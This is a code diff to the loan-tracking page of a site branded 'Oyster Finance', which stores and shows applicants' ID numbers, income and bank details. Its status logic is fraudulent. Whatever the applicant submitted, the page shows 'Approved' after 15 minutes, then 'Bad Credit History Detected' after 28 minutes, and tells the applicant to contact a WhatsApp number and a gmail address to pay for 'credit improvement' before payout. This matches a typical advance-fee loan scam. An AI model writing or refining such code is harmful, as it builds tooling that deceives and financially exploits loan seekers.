@@ -183,6 +183,7 @@ html, body {
     min-width: 60px;
     max-width: 80px;
     position: relative;
+    text-decoration: none;
 }
 
 .nav-item.active {
@@ -527,6 +528,17 @@ html, body {
     box-shadow: 0 2px 8px rgba(0, 102, 255, 0.2);
 }
 
+.btn-outline {
+    background-color: transparent;
+    border: 2px solid var(--primary);
+    color: var(--primary);
+}
+
+.btn-outline:active {
+    background-color: rgba(0, 102, 255, 0.05);
+    transform: scale(0.98);
+}
+
 .btn-block {
     display: flex;
     width: 100%;
@@ -802,6 +814,36 @@ html, body {
 .logout-button i {
     margin-right: 5px;
 }
+
+/* No Application Message */
+.no-application-message {
+    text-align: center;
+    padding: 40px 20px;
+    background-color: white;
+    border-radius: 20px;
+    margin: 20px;
+    box-shadow: var(--card-shadow);
+}
+
+.no-application-icon {
+    font-size: 60px;
+    color: var(--gray-light);
+    margin-bottom: 20px;
+}
+
+.no-application-title {
+    font-size: 24px;
+    font-weight: 700;
+    color: var(--dark);
+    margin-bottom: 15px;
+}
+
+.no-application-text {
+    font-size: 16px;
+    color: var(--gray);
+    margin-bottom: 30px;
+    line-height: 1.5;
+}
 </style>
 </head>
 <body>
@@ -814,7 +856,7 @@ html, body {
         <h1>Oyster Finance</h1>
         <div class="header-actions">
             <div class="header-nav">
-                <a href="#" class="header-nav-link">Home</a>
+                <a href="index.html" class="header-nav-link">Home</a>
                 <a href="#" class="header-nav-link">Apply</a>
                 <a href="#" class="header-nav-link">About</a>
             </div>
@@ -885,6 +927,18 @@ html, body {
                 </div>
             </div>
 
+            <!-- No Application Message (initially hidden) -->
+            <div id="no-application-section" style="display: none;">
+                <div class="no-application-message">
+                    <div class="no-application-icon">
+                        <i class="fas fa-file-alt"></i>
+                    </div>
+                    <h2 class="no-application-title">No Application Found</h2>
+                    <p class="no-application-text">You haven't submitted a loan application yet. Please complete the application form first to track your application status.</p>
+                    <a href="index.html" class="btn btn-primary">Apply for a Loan</a>
+                </div>
+            </div>
+
             <!-- Application Tracking Portal (initially hidden) -->
             <div id="portal-section" style="display: none;">
                 <button class="logout-button" id="logoutButton">
@@ -933,9 +987,17 @@ html, body {
                         <span>Loan Purpose:</span>
                         <span id="detailPurpose">-</span>
                     </div>
+                    <div class="detail-row">
+                        <span>Monthly Income:</span>
+                        <span id="detailIncome">-</span>
+                    </div>
+                    <div class="detail-row">
+                        <span>Bank Name:</span>
+                        <span id="detailBank">-</span>
+                    </div>
                 </div>
 
-                <div class="card">
+                <div class="card" id="nextStepsCard">
                     <div class="card-title with-line">Next Steps</div>
                     <p>Our team is currently reviewing your application. You will receive an SMS and email notification once a decision has been made.</p>
                     <p style="margin-top: 15px;">For any queries, please contact us at:</p>
@@ -973,16 +1035,14 @@ html, body {
 
      <!-- Bottom Navigation -->
     <div class="bottom-nav">
-        <div class="bottom-nav">
-    <a href="index.html" class="nav-item active" data-page="home">
-        <i class="fas fa-home"></i>
-        <span>Home</span>
-        
-        <a href="profile.html" class="nav-item" data-page="account">
-    <i class="fas fa-user"></i>
-    <span>Account</span>
-</a>
-       
+        <a href="index.html" class="nav-item" data-page="home">
+            <i class="fas fa-home"></i>
+            <span>Home</span>
+        </a>
+        <a href="profile.html" class="nav-item active" data-page="account">
+            <i class="fas fa-user"></i>
+            <span>Account</span>
+        </a>
     </div>
 
     <!-- WhatsApp Button -->
@@ -1008,25 +1068,6 @@ html, body {
 <!-- JavaScript -->
 <script>
 document.addEventListener('DOMContentLoaded', function() {
-    // Navigation
-    const navItems = document.querySelectorAll('.nav-item');
-    
-    navItems.forEach(item => {
-        item.addEventListener('click', function() {
-            // For demo purposes, just show a notification
-            const pageId = this.getAttribute('data-page');
-            if (pageId !== 'account') {
-                const popup = document.getElementById('popupNotification');
-                document.getElementById('popupText').textContent = '.';
-                popup.classList.add('show');
-                
-                setTimeout(function() {
-                    popup.classList.remove('show');
-                }, 3000);
-            }
-        });
-    });
-    
     // WhatsApp Button
     document.getElementById('whatsapp-button').addEventListener('click', function() {
         window.open('https://wa.me/+27698480097', '_blank');
@@ -1040,6 +1081,27 @@ document.addEventListener('DOMContentLoaded', function() {
     const loginPin = document.getElementById('loginPin');
     const createPin = document.getElementById('createPin');
     const confirmPin = document.getElementById('confirmPin');
+    
+    // Function to get application data from localStorage
+    function getApplicationData() {
+        try {
+            const savedData = localStorage.getItem('loanApplication');
+            if (savedData) {
+                return JSON.parse(savedData);
+            }
+            
+            // Check sessionStorage as backup
+            const sessionData = sessionStorage.getItem('loanApplication');
+            if (sessionData) {
+                return JSON.parse(sessionData);
+            }
+            
+            return null;
+        } catch (error) {
+            console.error('Error retrieving application data:', error);
+            return null;
+        }
+    }
     
     // Check ID Button
     document.getElementById('checkIdButton').addEventListener('click', function() {
@@ -1055,6 +1117,25 @@ document.addEventListener('DOMContentLoaded', function() {
         
         setTimeout(function() {
             document.getElementById('loader').classList.remove('show');
+            
+            // Get application data
+            const applicationData = getApplicationData();
+            
+            if (!applicationData) {
+                // No application found
+                showNotification('No loan application found. Please apply first.', 'error');
+                document.getElementById('login-section').style.display = 'none';
+                document.getElementById('no-application-section').style.display = 'block';
+                return;
+            }
+            
+            // Check if the ID matches the application
+            if (applicationData.idNumber !== idNumber) {
+                showNotification('No application found for this ID number.', 'error');
+                document.getElementById('login-section').style.display = 'none';
+                document.getElementById('no-application-section').style.display = 'block';
+                return;
+            }
             
             // Check if user exists in localStorage
             const userDataString = localStorage.getItem('userData_' + idNumber);
@@ -1089,32 +1170,10 @@ document.addEventListener('DOMContentLoaded', function() {
                     showNotification('An error occurred. Please try again.', 'error');
                 }
             } else {
-                // Check if there's an application with this ID
-                const savedApplication = localStorage.getItem('loanApplication');
-                
-                if (savedApplication) {
-                    try {
-                        const applicationData = JSON.parse(savedApplication);
-                        
-                        if (applicationData.idNumber === idNumber) {
-                            // Application exists but no user account, ask to create PIN
-                            idInputStep.style.display = 'none';
-                            createPinStep.style.display = 'block';
-                            showNotification('Please create a PIN for your account.', 'info');
-                        } else {
-                            showNotification('No account found with this ID number.', 'error');
-                        }
-                    } catch (error) {
-                        console.error("Error parsing application data:", error);
-                        showNotification('An error occurred. Please try again.', 'error');
-                    }
-                } else {
-                    // No user or application found, create demo data
-                    createDemoData(idNumber);
-                    idInputStep.style.display = 'none';
-                    createPinStep.style.display = 'block';
-                    showNotification('Welcome! Please create a PIN for your account.', 'info');
-                }
+                // Application exists but no user account, ask to create PIN
+                idInputStep.style.display = 'none';
+                createPinStep.style.display = 'block';
+                showNotification('Please create a PIN for your account.', 'info');
             }
         }, 1000);
     });
@@ -1218,163 +1277,154 @@ document.addEventListener('DOMContentLoaded', function() {
     
     // Function to complete login and show application details
     function completeLogin(idNumber) {
+        // Get application data
+        const applicationData = getApplicationData();
+        
+        if (!applicationData || applicationData.idNumber !== idNumber) {
+            showNotification('No application found for this account.', 'error');
+            document.getElementById('login-section').style.display = 'none';
+            document.getElementById('no-application-section').style.display = 'block';
+            return;
+        }
+        
         // Hide login form and show portal
         document.getElementById('login-section').style.display = 'none';
         document.getElementById('portal-section').style.display = 'block';
         
-        // Get application data
-        const savedApplication = localStorage.getItem('loanApplication');
-        let applicationData;
-        
-        if (savedApplication) {
-            try {
-                applicationData = JSON.parse(savedApplication);
-                
-                // Check if this application belongs to the logged-in user
-                if (applicationData.idNumber === idNumber) {
-                    displayApplicationData(applicationData);
-                } else {
-                    // Application exists but belongs to another user
-                    createAndDisplayDemoData(idNumber);
-                }
-            } catch (error) {
-                console.error("Error parsing application data:", error);
-                createAndDisplayDemoData(idNumber);
-            }
-        } else {
-            // No application found
-            createAndDisplayDemoData(idNumber);
-        }
+        // Display the real application data
+        displayApplicationData(applicationData);
         
         showNotification('Login successful!', 'success');
     }
     
     // Function to display application data
     function displayApplicationData(data) {
-        // Populate application details
-        document.getElementById('detailName').textContent = data.fullName || 'N/A';
-        document.getElementById('detailId').textContent = data.idNumber || 'N/A';
-        document.getElementById('detailPhone').textContent = data.contactNumber || 'N/A';
-        document.getElementById('detailEmail').textContent = data.emailAddress || 'N/A';
-        document.getElementById('detailAmount').textContent = 'R' + (data.loanAmount || '0');
-        document.getElementById('detailTerm').textContent = (data.loanTerm || '0') + ' months';
-        document.getElementById('detailPurpose').textContent = data.loanPurpose || 'N/A';
-        document.getElementById('applicationDate').textContent = data.applicationDate || new Date().toLocaleDateString();
+        // Populate application details with real data
+        document.getElementById('detailName').textContent = data.fullName || 'Not provided';
+        document.getElementById('detailId').textContent = data.idNumber || 'Not provided';
+        document.getElementById('detailPhone').textContent = data.contactNumber || 'Not provided';
+        document.getElementById('detailEmail').textContent = data.emailAddress || 'Not provided';
+        
+        // Format loan amount
+        if (data.loanAmountRequest) {
+            let amount = data.loanAmountRequest.toString().replace(/[^0-9]/g, '');
+            document.getElementById('detailAmount').textContent = 'R' + parseInt(amount).toLocaleString();
+        } else {
+            document.getElementById('detailAmount').textContent = 'Not provided';
+        }
+        
+        // Format loan term
+        if (data.loanTermSelect) {
+            document.getElementById('detailTerm').textContent = data.loanTermSelect + ' months';
+        } else {
+            document.getElementById('detailTerm').textContent = 'Not provided';
+        }
+        
+        document.getElementById('detailPurpose').textContent = data.loanPurposeSelect || 'Not provided';
+        
+        // Format monthly income
+        if (data.monthlyIncome) {
+            let income = data.monthlyIncome.toString().replace(/[^0-9]/g, '');
+            document.getElementById('detailIncome').textContent = 'R' + parseInt(income).toLocaleString();
+        } else {
+            document.getElementById('detailIncome').textContent = 'Not provided';
+        }
+        
+        document.getElementById('detailBank').textContent = data.bankName || 'Not provided';
+        
+        // Set application date
+        if (data.submissionDate) {
+            const date = new Date(data.submissionDate);
+            document.getElementById('applicationDate').textContent = date.toLocaleDateString();
+        } else {
+            document.getElementById('applicationDate').textContent = new Date().toLocaleDateString();
+        }
         
         // Set application status based on application time
         updateApplicationStatus(data);
     }
     
     // Function to update application status based on time
-    // Function to update application status based on time
-function updateApplicationStatus(data) {
-    const applicationTime = data.applicationTimestamp || new Date().getTime();
-    const currentTime = new Date().getTime();
-    const timeDiff = currentTime - applicationTime;
-    
-    const statusIndicator = document.getElementById('statusIndicator');
-    const statusText = document.getElementById('statusText');
-    const progressFill = document.getElementById('applicationProgress');
-    const progressPercentage = document.getElementById('progressPercentage');
-    
-    // 15 minutes in milliseconds
-    const fifteenMinutes = 15 * 60 * 1000;
-    // 28 minutes in milliseconds
-    const twentyEightMinutes = 28 * 60 * 1000;
-    // 32 minutes in milliseconds
-    const thirtyTwoMinutes = 32 * 60 * 1000;
-    
-    let progress = 0;
-    
-    if (timeDiff < fifteenMinutes) {
-        // First stage: Instant 65% with real-time updates
-        // Calculate progress from 65% to 97% based on time elapsed
-        progress = 65 + Math.min(Math.floor((timeDiff / fifteenMinutes) * 32), 32);
-        statusIndicator.className = 'status-indicator status-pending';
-        statusText.textContent = 'Application received and we are Processing';
+    function updateApplicationStatus(data) {
+        const applicationTime = data.submissionDate ? new Date(data.submissionDate).getTime() : new Date().getTime();
+        const currentTime = new Date().getTime();
+        const timeDiff = currentTime - applicationTime;
         
-        // Update status every 30 seconds if in processing stage
-        setTimeout(function() {
-            updateApplicationStatus(data);
-        }, 30000);
-    } else if (timeDiff < twentyEightMinutes) {
-        // Second stage: 15-28 minutes: 98% "Your Loan Application Qualify for an Approval"
-        progress = 69;
-        statusIndicator.className = 'status-indicator status-approved';
-        statusText.textContent = 'Your Loan Application has been Approved';
+        const statusIndicator = document.getElementById('statusIndicator');
+        const statusText = document.getElementById('statusText');
+        const progressFill = document.getElementById('applicationProgress');
+        const progressPercentage = document.getElementById('progressPercentage');
         
-        // If just entered this stage, update after the remaining time to reach 28 minutes
-        const timeToNextStage = twentyEightMinutes - timeDiff;
-        if (timeToNextStage > 0) {
+        // 15 minutes in milliseconds
+        const fifteenMinutes = 15 * 60 * 1000;
+        // 28 minutes in milliseconds
+        const twentyEightMinutes = 28 * 60 * 1000;
+        
+        let progress = 0;
+        
+        if (timeDiff < fifteenMinutes) {
+            // First stage: Processing (65-97%)
+            progress = 65 + Math.min(Math.floor((timeDiff / fifteenMinutes) * 32), 32);
+            statusIndicator.className = 'status-indicator status-pending';
+            statusText.textContent = 'Application received and we are Processing';
+            
+            // Update status every 30 seconds if in processing stage
             setTimeout(function() {
                 updateApplicationStatus(data);
-            }, timeToNextStage + 1000); // Add 1 second buffer
+            }, 30000);
+        } else if (timeDiff < twentyEightMinutes) {
+            // Second stage: Approved (98%)
+            progress = 98;
+            statusIndicator.className = 'status-indicator status-approved';
+            statusText.textContent = 'Your Loan Application has been Approved';
+            
+            // If just entered this stage, update after the remaining time to reach 28 minutes
+            const timeToNextStage = twentyEightMinutes - timeDiff;
+            if (timeToNextStage > 0) {
+                setTimeout(function() {
+                    updateApplicationStatus(data);
+                }, timeToNextStage + 1000); // Add 1 second buffer
+            }
+        } else {
+            // Final stage: Credit issue detected (97%)
+            progress = 97;
+            statusIndicator.className = 'status-indicator status-rejected';
+            statusText.textContent = 'Bad Credit History Detected';
+            
+            // Update the next steps card with credit improvement message
+            const nextStepsCard = document.getElementById('nextStepsCard');
+            if (nextStepsCard) {
+                nextStepsCard.innerHTML = `
+                    <div class="card-title with-line">Credit Improvement Required</div>
+                    <p>We've detected issues with your credit history that need to be addressed before we can proceed with your loan payout.</p>
+                    <p style="margin-top: 15px; font-weight: bold; color: var(--primary);">Please contact us immediately via email or WhatsApp to complete your credit improvement process:</p>
+                    <div class="contact-item">
+                        <div class="contact-icon">
+                            <i class="fab fa-whatsapp"></i>
+                        </div>
+                        <div class="contact-text">
+                            <strong>WhatsApp</strong>
+                            +27698480097
+                        </div>
+                    </div>
+                    <div class="contact-item">
+                        <div class="contact-icon">
+                            <i class="fas fa-envelope"></i>
+                        </div>
+                        <div class="contact-text">
+                            <strong>Email</strong>
+                            oysterfinanceltd@gmail.com
+                        </div>
+                    </div>
+                    <button class="btn btn-primary btn-block" onclick="window.open('https://wa.me/+27698480097', '_blank')">
+                        <i class="fab fa-whatsapp" style="margin-right: 10px;"></i> Contact Us Now
+                    </button>
+                `;
+            }
         }
-    } else {
-        // Final stage: After 28-32 minutes: "Bad Credit History Detected"
-        progress = 97;
-        statusIndicator.className = 'status-indicator status-rejected';
-        statusText.textContent = 'Bad Credit History Detected';
         
-        // Update the next steps card with credit improvement message
-        const nextStepsCard = document.querySelector('#portal-section .card:last-child');
-        if (nextStepsCard) {
-            nextStepsCard.innerHTML = `
-                <div class="card-title with-line">Credit Improvement Required</div>
-                <p>We've detected issues with your credit history that need to be addressed before we can proceed with your loan payout.</p>
-                <p style="margin-top: 15px; font-weight: bold; color: var(--primary);">Please contact us immediately via email or whatsapp to complete your credit improvement process:</p>
-                <div class="contact-item">
-                    <div class="contact-icon">
-                        <i class="fab fa-whatsapp"></i>
-                    </div>
-                    <div class="contact-text">
-                        <strong>WhatsApp</strong>
-                        +27698480097
-                    </div>
-                </div>
-                <div class="contact-item">
-                    <div class="contact-icon">
-                        <i class="fas fa-envelope"></i>
-                    </div>
-                    <div class="contact-text">
-                        <strong>Email</strong>
-                        oysterfinanceltd@gmail.com
-                    </div>
-                </div>
-                <button class="btn btn-primary btn-block" onclick="window.open('https://wa.me/+27698480097', '_blank')">
-                    <i class="fab fa-whatsapp" style="margin-right: 10px;"></i> Contact Us Now
-                </button>
-            `;
-        }
-    }
-    
-    progressFill.style.width = progress + '%';
-    progressPercentage.textContent = progress + '%';
-}
-    
-    // Function to create demo data for a new user
-    function createDemoData(idNumber) {
-        const now = new Date();
-        const demoData = {
-            idNumber: idNumber,
-            fullName: "Demo User",
-            contactNumber: "+27 71 234 5678",
-            emailAddress: "demo.user@example.com",
-            loanAmount: "50000",
-            loanTerm: "24",
-            loanPurpose: "Personal Loan",
-            applicationDate: now.toLocaleDateString(),
-            applicationTimestamp: now.getTime()
-        };
-        
-        localStorage.setItem('loanApplication', JSON.stringify(demoData));
-        return demoData;
-    }
-    
-    // Function to create and display demo data
-    function createAndDisplayDemoData(idNumber) {
-        const demoData = createDemoData(idNumber);
-        displayApplicationData(demoData);
+        progressFill.style.width = progress + '%';
+        progressPercentage.textContent = progress + '%';
     }
     
     // Function to show notifications
@@ -1399,36 +1449,11 @@ function updateApplicationStatus(data) {
         }, 3000);
     }
     
-    // Check for existing session on page load
-    function checkExistingSession() {
-        // Iterate through localStorage to find user data
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            
-            if (key.startsWith('userData_')) {
-                try {
-                    const userData = JSON.parse(localStorage.getItem(key));
-                    const now = new Date().getTime();
-                    const lastLogin = userData.lastLogin || 0;
-                    const thirtyDaysInMs = 30 * 24 * 60 * 60 * 1000;
-                    
-                    // If login is within 30 days, pre-fill ID
-                    if (now - lastLogin < thirtyDaysInMs) {
-                        document.getElementById('loginId').value = userData.idNumber;
-                        showNotification('Welcome back! Please enter your ID to continue.', 'info');
-                        break;
-                    }
-                } catch (error) {
-                    console.error("Error checking existing session:", error);
-                }
-            }
-        }
-    }
-
     // Logout Button
     document.getElementById('logoutButton').addEventListener('click', function() {
         // Hide portal and show login form
         document.getElementById('portal-section').style.display = 'none';
+        document.getElementById('no-application-section').style.display = 'none';
         document.getElementById('login-section').style.display = 'block';
         
         // Reset login form to ID input step
@@ -1436,13 +1461,48 @@ function updateApplicationStatus(data) {
         document.getElementById('pin-input-step').style.display = 'none';
         document.getElementById('create-pin-step').style.display = 'none';
         
-        // Clear PIN inputs
+        // Clear all inputs
+        document.getElementById('loginId').value = '';
         document.getElementById('loginPin').value = '';
         document.getElementById('createPin').value = '';
         document.getElementById('confirmPin').value = '';
         
         showNotification('You have been logged out.', 'info');
     });
+    
+    // Check for existing session on page load
+    function checkExistingSession() {
+        // Check if there's an application first
+        const applicationData = getApplicationData();
+        
+        if (!applicationData) {
+            // No application found, show no application message
+            document.getElementById('login-section').style.display = 'none';
+            document.getElementById('no-application-section').style.display = 'block';
+            return;
+        }
+        
+        // Pre-fill ID if application exists
+        document.getElementById('loginId').value = applicationData.idNumber || '';
+        
+        // Check for recent login session
+        const userDataString = localStorage.getItem('userData_' + applicationData.idNumber);
+        if (userDataString) {
+            try {
+                const userData = JSON.parse(userDataString);
+                const now = new Date().getTime();
+                const lastLogin = userData.lastLogin || 0;
+                const thirtyDaysInMs = 30 * 24 * 60 * 60 * 1000;
+                
+                // If login is within 30 days, show welcome message
+                if (now - lastLogin < thirtyDaysInMs) {
+                    showNotification('Welcome back! Please enter your ID to continue.', 'info');
+                }
+            } catch (error) {
+                console.error("Error checking existing session:", error);
+            }
+        }
+    }
     
     // Initialize
     checkExistingSession();
